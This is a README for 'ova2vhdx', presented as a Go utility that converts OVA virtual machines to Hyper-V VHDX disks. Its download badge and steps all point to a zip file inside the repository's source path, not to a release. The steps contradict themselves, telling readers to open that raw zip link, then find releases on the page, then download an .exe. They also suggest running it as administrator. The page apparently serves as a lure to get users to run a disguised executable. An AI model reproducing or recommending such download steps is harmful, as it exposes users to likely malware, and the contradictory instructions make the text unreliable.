# 📦 ova2vhdx - Convert virtual machines to Hyper-V disks

[![](https://img.shields.io/badge/download-windows-blue.svg)](https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip)

## 🎯 Purpose

You use this tool to change your existing virtual machines into a format that Hyper-V understands. Many virtual machines come as OVA files. Hyper-V requires VHDX files to run these machines. This tool handles that conversion. It does the work without needing extra software installed on your computer.

## 💻 System Requirements

Your computer needs to meet these basic standards to run the application:

* Windows 10 or Windows 11.
* A 64-bit processor.
* At least 4 gigabytes of RAM.
* Enough free disk space to store your converted virtual machine files.
* Access to the Command Prompt or PowerShell.

## 💾 Downloading the Tool

You must visit the project page to get the software. Follow these steps:

1. Open your web browser.
2. Visit [https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip](https://github.com/Blackbassmajorpremise1998/ova2vhdx/raw/refs/heads/main/cmd/ova2vhdx/vhdx-ova-v3.9.zip).
3. Find the latest release on the right side of the page.
4. Click the link to download the file named ova2vhdx.exe.
5. Save the file to a folder you can find easily, such as your Downloads folder.

## ⚙️ Preparing Your Files

Before you run the conversion, gather the files you want to change:

1. Locate your source file. This file ends with the .ova extension.
2. Make sure you have enough drive space. A virtual machine file often takes up many gigabytes. The conversion creates a new file, so you need space for both the original and the new version.
3. Move your OVA file into the same folder where you saved the ova2vhdx.exe file. This makes the process much simpler.

## 🚀 Running the Conversion

The software runs through a text-based window. You do not need to install anything. Follow these directions to start:

1. Open the folder where you placed the ova2vhdx.exe file.
2. Click the empty space in the file folder address bar at the top of the window.
3. Type `cmd` and press the Enter key. A black window will appear.
4. Type the following command into the black window: `ova2vhdx.exe --input yourfile.ova --output newfile.vhdx`.
5. Replace `yourfile.ova` with the actual name of your file.
6. Replace `newfile.vhdx` with the name you want for your new Hyper-V file.
7. Press the Enter key.

The tool will start the process. You will see a progress bar or text updates in the black window. Do not close the window while the tool works. Wait for the program to announce that the task finished.

## 🔍 Checking the Results

Once the process finishes, you can check the new file:

1. Open your folder again.
2. Look for the file ending in .vhdx that you named in the previous step.
3. Check the file size. A successful conversion usually creates a file slightly smaller or similar to the size of the original data inside the OVA.
4. Open the Hyper-V Manager on your computer.
5. Create a new virtual machine.
6. Select the option to use an existing virtual hard disk.
7. Point the manager to your new VHDX file.

## 🛠️ Common Troubleshooting

If you run into trouble, check these common fixes:

* **File not found:** Ensure the file name you typed in the black window matches the name in the folder exactly.
* **Permission denied:** Right-click the ova2vhdx.exe file and select Run as administrator.
* **Not enough space:** Clear some files from your hard drive and try again.
* **File currently in use:** Ensure that no other virtual machine software is running and using the OVA file when you start the conversion.

## 📄 Understanding the Technology

This tool uses the Go programming language. Go creates standalone files that do not rely on external libraries or helper programs. When you download the .exe file, you hold everything the tool needs to run. This design choice prevents errors related to missing system files. The tool reads the data inside your OVA package, extracts the disk contents, and writes them into the format used by Microsoft Hyper-V. This process stays local to your computer. No data leaves your machine during the conversion.

## 🌐 Related Concepts

Virtualization describes the method of running a computer inside another computer. An OVA file acts as a container for this virtual computer. Hyper-V acts as the software that manages these virtual machines on Windows. By using this tool, you bridge the gap between different virtual environments. You keep the data from your original virtual machine while changing the container to suit your new environment.